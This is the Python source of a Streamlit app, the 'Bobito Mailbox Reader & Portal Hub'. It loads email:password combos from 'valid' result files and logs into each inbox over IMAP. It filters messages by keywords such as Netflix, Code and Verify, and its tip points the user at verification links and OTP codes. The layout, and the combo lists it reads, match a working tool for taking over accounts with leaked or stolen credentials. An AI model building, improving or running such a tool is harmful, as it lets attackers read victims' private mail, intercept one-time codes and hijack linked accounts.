import streamlit as st
import imaplib
import email
from email.header import decode_header
import os
import glob
import pandas as pd
import warnings

warnings.filterwarnings("ignore")

# Page Config for Mobile & Desktop Responsive Layout
st.set_page_config(
    page_title="Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Keep-Alive Injector Script for Mobile / Safari Sessions
st.markdown(
    """<script>
    setInterval(function() {
        fetch('/_stcore/health').then(function(res) {
            // Keep connection alive
        }).catch(function(err) {});
    }, 25000);
    </script>""",
    unsafe_allow_html=True
)

def load_valid_accounts():
    accounts = []
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    for extra in ("clean_valid_accounts.txt", "valid_accounts.txt"):
        if os.path.exists(extra):
            paths.append(extra)
    
    seen = set()
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        parts = line.split(":")
                        email_addr = parts[0].strip()
                        pwd = parts[1].split("|")[0].strip()
                        combo = f"{email_addr}:{pwd}"
                        if combo not in seen:
                            seen.add(combo)
                            accounts.append(combo)
        except Exception:
            continue
    return accounts

def guess_imap_server(email_addr):
    try:
        domain = email_addr.split("@")[-1].lower()
        PROVIDER_CONFIGS = {
            "mideon.nir.jp": {
                "imap_host": "imap.cyberhome.ne.jp",
                "imap_port": 993,
            }
        }
        if domain in PROVIDER_CONFIGS:
            return PROVIDER_CONFIGS[domain]["imap_host"]
            
        mapping = {
            "gmail.com": "imap.gmail.com",
            "googlemail.com": "imap.gmail.com",
            "outlook.com": "outlook.office365.com",
            "hotmail.com": "outlook.office365.com",
            "live.com": "outlook.office365.com",
            "yahoo.com": "imap.mail.yahoo.com",
            "icloud.com": "imap.mail.me.com",
            "naver.com": "imap.naver.com",
            "qq.com": "imap.qq.com"
        }
        return mapping.get(domain, f"imap.{domain}")
    except Exception:
        return "imap.gmail.com"

def get_webmail_portal_url(email_addr):
    try:
        domain = email_addr.split("@")[-1].lower()
        PORTAL_CONFIGS = {
            "mideon.nir.jp": "https://wmail.cyberhome.ne.jp"
        }
        if domain in PORTAL_CONFIGS:
            return PORTAL_CONFIGS[domain]
            
        mapping = {
            "gmail.com": "https://mail.google.com",
            "googlemail.com": "https://mail.google.com",
            "outlook.com": "https://outlook.live.com",
            "hotmail.com": "https://outlook.live.com",
            "live.com": "https://outlook.live.com",
            "yahoo.com": "https://mail.yahoo.com",
            "icloud.com": "https://www.icloud.com/mail",
            "aol.com": "https://mail.aol.com",
            "zoho.com": "https://mail.zoho.com"
        }
        return mapping.get(domain, f"https://mail.{domain}")
    except Exception:
        return "https://google.com"

def decode_mime_header(header_value):
    try:
        decoded_parts = decode_header(header_value)
        result = ""
        for part, encoding in decoded_parts:
            if isinstance(part, bytes):
                result += part.decode(encoding or "utf-8", errors="ignore")
            else:
                result += str(part)
        return result
    except Exception:
        return str(header_value)

# --- Bobito-Style Interface Header ---
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.markdown("High-performance IMAP inbox explorer optimized for mobile Safari and desktop sessions.")

valid_accs = load_valid_accounts()

# --- Sidebar Configuration Hub ---
st.sidebar.header("⚙ Reader & Portal Config")
selected_account = st.sidebar.selectbox("Select Valid Account", options=valid_accs if valid_accs else ["No valid accounts found"], key="mb_selected_account")

custom_email = st.sidebar.text_input("Or enter custom email", key="mb_custom_email")
custom_pass = st.sidebar.text_input("Or enter custom password", type="password", key="mb_custom_pass")

target_email = custom_email.strip() if custom_email.strip() else (selected_account.split(":")[0] if ":" in selected_account else "")
target_pass = custom_pass.strip() if custom_pass.strip() else (selected_account.split(":")[1] if ":" in selected_account else "")

# Persistent Session State Sync
st.session_state['email'] = target_email
st.session_state['password'] = target_pass

server_host = st.sidebar.text_input("IMAP Server Host (Blank for Auto)", value="", key="mb_server_host")
search_keyword = st.sidebar.text_input("Keyword Filter (Optional)", value="", placeholder="e.g. Netflix, Code, Verify", key="mb_search_keyword")

st.sidebar.markdown("---")
st.sidebar.subheader("📊 Pagination Settings")
batch_size = st.sidebar.slider("Messages per Page", min_value=5, max_value=50, value=10, key="mb_batch_size")

# Main Action Controls
connect_pressed = st.button("📥 Connect & Read IMAP Inbox", type="primary", use_container_width=True, key="mb_connect_btn")

# --- Smart Webmail Portal Quick Bar ---
if target_email:
    portal_url = get_webmail_portal_url(target_email)
    st.markdown("---")
    st.subheader("🌐 Webmail & Credential Portal")
    col_w1, col_w2 = st.columns([2, 2])
    with col_w1:
        st.markdown(f"**Target Portal:** `{portal_url}`")
        st.link_button("🔗 Open Webmail Portal", portal_url, use_container_width=True)
    with col_w2:
        st.markdown(f"**Active Combo:** `{target_email}:{target_pass}`")
        st.success("🟢 Ready for connection and secure token parsing.")
    st.markdown("---")

# --- IMAP Retrieval & Lazy Loading Execution ---
if connect_pressed:
    if not target_email or not target_pass:
        st.warning("⚠ Please provide a valid target email and password combo.")
    else:
        host = server_host.strip() if server_host.strip() else guess_imap_server(target_email)
        st.session_state['imap_host'] = host
        
        with st.spinner(f"Connecting to IMAP secure gateway **{host}:993**..."):
            try:
                mail = imaplib.IMAP4_SSL(host, 993, timeout=12)
                mail.login(target_email, target_pass)
                mail.select("INBOX")
                
                # Search execution
                if search_keyword.strip():
                    status, response = mail.search(None, f'(SUBJECT "{search_keyword.strip()}")')
                else:
                    status, response = mail.search(None, "ALL")
                    
                if status != "OK":
                    st.error("Failed to query mailbox messages.")
                else:
                    msg_nums = response[0].split()
                    if not msg_nums:
                        st.warning("No messages found matching criteria.")
                        mail.logout()
                    else:
                        latest_nums = msg_nums[-batch_size:][::-1]
                        lightweight_messages = []
                        
                        for num in latest_nums:
                            st_fetch, msg_data = mail.fetch(num, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)] FLAGS)")
                            if st_fetch != "OK":
                                continue
                            
                            subject, sender, date_str = "No Subject", "Unknown", "Unknown"
                            for response_part in msg_data:
                                if isinstance(response_part, tuple):
                                    msg = email.message_from_bytes(response_part[1])
                                    subject = decode_mime_header(msg.get("Subject", "No Subject"))
                                    sender = decode_mime_header(msg.get("From", "Unknown"))
                                    date_str = msg.get("Date", "Unknown")
                            
                            lightweight_messages.append({
                                "id": num.decode(),
                                "date": date_str,
                                "sender": sender,
                                "subject": subject,
                                "imap_connection": mail
                            })
                        
                        st.session_state['fetched_messages'] = lightweight_messages
                        st.success(f"Successfully loaded {len(lightweight_messages)} inbox headers!")
            except Exception as ex:
                st.error(f"Connection error: {ex}")

# Render Inbox Messages if Available in Session State
if 'fetched_messages' in st.session_state and st.session_state['fetched_messages']:
    st.markdown("### 📬 Inbox Message Stream")
    
    tab_all, tab_unread = st.tabs(["📂 All Fetched", "⭐ Recent Quick View"])
    
    with tab_all:
        for idx, item in enumerate(st.session_state['fetched_messages']):
            with st.expander(f"✉ [{item['date']}] {item['sender'][:35]} — {item['subject'][:45]}"):
                st.markdown(f"**From:** `{item['sender']}`")
                st.markdown(f"**Subject:** `{item['subject']}`")
                st.markdown(f"**Date:** `{item['date']}`")
                st.markdown("---")
                
                if st.button(f"📥 Load Full Message Body #{item['id']}", key=f"load_body_{item['id']}_{idx}"):
                    with st.spinner("Fetching full payload from server..."):
                        try:
                            mail_conn = item['imap_connection']
                            st_f, m_data = mail_conn.fetch(item['id'].encode(), "(RFC822)")
                            body_text = "Could not parse body."
                            if st_f == "OK":
                                for part in m_data:
                                    if isinstance(part, tuple):
                                        full_msg = email.message_from_bytes(part[1])
                                        if full_msg.is_multipart():
                                            for subpart in full_msg.walk():
                                                if subpart.get_content_type() == "text/plain":
                                                    payload = subpart.get_payload(decode=True)
                                                    if payload:
                                                        body_text = payload.decode("utf-8", errors="ignore")
                                                        break
                                        else:
                                            payload = full_msg.get_payload(decode=True)
                                            if payload:
                                                body_text = payload.decode("utf-8", errors="ignore")
                            st.text_area("Message Content", body_text, height=200, key=f"body_area_{item['id']}")
                        except Exception as ex:
                            st.error(f"Error loading body: {ex}")
                            
    with tab_unread:
        st.info("💡 Tip: Use the 'Load Full Message Body' button inside each card above to inspect verification links or OTP codes instantly.")
        for item in st.session_state['fetched_messages'][:5]:
            st.markdown(f"- **{item['subject']}** (`{item['date']}`)")
